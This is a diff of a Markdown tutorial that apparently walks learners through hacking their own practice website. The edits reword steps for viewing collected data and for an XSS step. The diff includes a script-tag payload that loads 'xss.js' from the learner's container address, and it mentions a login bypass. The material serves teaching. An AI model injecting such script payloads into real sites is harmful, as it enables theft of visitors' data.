@@ -153,10 +153,8 @@ CREATE TABLE secret (
 ```
 Press the `Go` button to execute the SQL.
 
-With the secret table created, you will now be ready to hack your website. To view the data that has been collected, visit the page:
-
-## NOTE from Andrea: this link will need updating - ie. with instruction on how to get there.
-#### [http://<YOUR_CONTAINER_ADDRESS>/secretshow.php](http://<YOUR_CONTAINER_ADDRESS>/secretshow.php)
+With the secret table created, you will now be ready to hack your website. To view the data that has been collected, visit the page (as always, substitute your container address below):
+[http://<YOUR_CONTAINER_ADDRESS>/secretshow.php](http://<YOUR_CONTAINER_ADDRESS>/secretshow.php)
 
 ## Adding the User Gateway
 If you have not set up the project yet, go to the section of this document titled Setting up the Project, and follow those instructions first. It will copy the necessary files over to your website, and set up the users database.
@@ -198,7 +196,7 @@ It doesn’t matter what you put in to the password field, so long as the name f
 When you have logged in using your “account”, it’s time to save some code to the website so that it can take over!
 
 #### Hacking Code 2
-Before we can the next piece of hacking code, we need to change something. The part of the text that says `<YOUR_CONTAINER_ADDRESS>` is the name of the computer you wish to load your `xss.js` from. You will need to replace the `<YOUR_CONTAINER_ADDRESS>` with the text you see when you look at your website. This will load `xss.js` from your server if/when you have set it up.
+Before we can the next piece of hacking code, we need to change something. The part of the text that says `<YOUR_CONTAINER_ADDRESS>` is the name of the computer you wish to load your `xss.js` from. **You will need to replace the `<YOUR_CONTAINER_ADDRESS>` with the text you see when you look at your website.** This will load `xss.js` from your server if/when you have set it up, which if was a real hack, could be injected into any website around the world (doesn't work that way in real life anymore, however, thanx to protections in most modern browsers).
 ```
 <script language=javascript src=http://<YOUR_CONTAINER_ADDRESS>/xss.js></script>
 ```  
